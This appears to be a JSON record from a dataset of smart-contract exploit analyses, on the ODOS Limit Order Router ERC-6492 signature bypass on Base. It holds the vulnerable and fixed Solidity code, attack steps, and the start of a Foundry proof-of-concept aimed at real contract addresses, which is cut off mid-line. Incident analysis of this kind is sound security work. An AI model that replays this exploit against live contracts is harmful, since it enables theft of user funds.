@@ -1,0 +1,36 @@
+{
+ "id": "2025__2025-01-27_ODOS_ERC6492SignatureBypass",
+ "source_file": "2025/2025-01-27_ODOS_ERC6492SignatureBypass.md",
+ "title": "ODOS Limit Order — ERC-6492 Signature Verification Bypass Analysis",
+ "date": "2025-01-27",
+ "protocol": "ODOS Limit Order Router",
+ "chain": "Base",
+ "loss_raw": "~$50,000",
+ "loss_usd": 50000.0,
+ "root_cause": "ERC-6492 signature handling in `isValidSigImpl()` allows arbitrary contract deployment and calldata execution via the `allowSideEffects=true` option",
+ "attack_tx": "0xd10faa5b...",
+ "vulnerable_contract": "0xb6333e99...",
+ "classes": [
+  "signature-replay"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: arbitrary calldata execution allowed via allowSideEffects=true\nfunction isValidSigImpl(\n    address _signer,\n    bytes32 _hash,\n    bytes calldata _signature,\n    bool allowSideEffects  // ← if true, side effects are permitted\n) external returns (bool) {\n    // Detect ERC-6492 suffix\n    if (bytes32(_signature[_signature.length-32:]) == ERC6492_DETECTION_SUFFIX) {\n        (address factory, bytes memory factoryCalldata, bytes memory sig)\n            = abi.decode(_signature[:_signature.length-32], (address, bytes, bytes));\n\n        // allowSideEffects=true → arbitrary contract deployment + calldata execution\n        if (allowSideEffects) {\n            //",
+  "❌ Executes factory.call(factoryCalldata) — arbitrary code execution!\n            (bool success,) = factory.call(factoryCalldata);\n        }\n        // ...\n    }\n}\n\n// Attacker's crafted signature:\n// factory = USDC contract\n// factoryCalldata = transfer(attacker, victimBalance)\n// suffix = ERC6492_DETECTION_SUFFIX\n\n//",
+  "❌ caller-controlled — attacker passes true\n  ) public returns (bool) {   //"
+ ],
+ "code_after": [
+  "✅ Safe code: force allowSideEffects to always be false\nfunction isValidSigImpl(\n    address _signer,\n    bytes32 _hash,\n    bytes calldata _signature,\n    bool // allowSideEffects parameter ignored\n) external view returns (bool) { // Changed to view — side effects impossible\n    // ERC-6492 handling performs signature verification only, with no side effects\n    // ...\n}",
+  "✅ safe path: revert to undo side effects when allowSideEffects=false\n          assembly {\n           mstore(0, isValid)\n           revert(31, 1)\n          }\n        }\n\n        return isValid;  //"
+ ],
+ "steps": [
+  "→ [1] Craft manipulated ERC-6492 format signature",
+  "→ [2] Call isValidSigImpl()",
+  "→ [3] Contract detects ERC-6492 suffix",
+  "→ [4] allowSideEffects=true → execute factory.call(factoryCalldata)",
+  "→ [5] Entire USDC in contract (~$50,000) drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Craft manipulated ERC-6492 format signature\n  │         ├─ factory: USDC contract address\n  │         ├─ factoryCalldata: transfer(attacker, victimBalance)\n  │         └─ suffix: ERC6492_DETECTION_SUFFIX (32 bytes)\n  │\n  ├─→ [2] Call isValidSigImpl()\n  │         ├─ _signer: arbitrary address (0x04)\n  │         ├─ _hash: bytes32(0)\n  │         ├─ _signature: manipulated ERC-6492 signature\n  │         └─ allowSideEffects: true\n  │\n  ├─→ [3] Contract detects ERC-6492 suffix\n  │\n  ├─→ [4] allowSideEffects=true → execute factory.call(factoryCalldata)\n  │         └─ USDC.transfer(attacker, victimBalance) executes!\n  │\n  └─→ [5] Entire USDC in contract (~$50,000) drained",
+  "// Actual PoC code (based on DeFiHackLabs verified code)\n\ncontract ContractTest is Test {\n    OdosLimitOrderRouter odosLimitOrderRouterInstance =\n        OdosLimitOrderRouter(0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7);\n    IUSDC USDCInstance = IUSDC(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);\n\n    // ERC-6492 detection suffix (32-byte repeating pattern)\n    bytes32 ERC6492_DETECTION_SUFFIX =\n        bytes32(hex\"6492649264926492649264926492649264926492649264926492649264926492\");\n\n    function testExploit() public {\n        // [1] Query USDC balance of the victim contract\n        uint256 victimUSDCBalance = USDCInstance.balanceOf(\n            address(odosLimitOrderRouterInstance)\n        );\n\n        // [2] Crafted calldata: USDC.transfer(attacker, fullBalance)\n        bytes memory customCa"
+ ]
+}
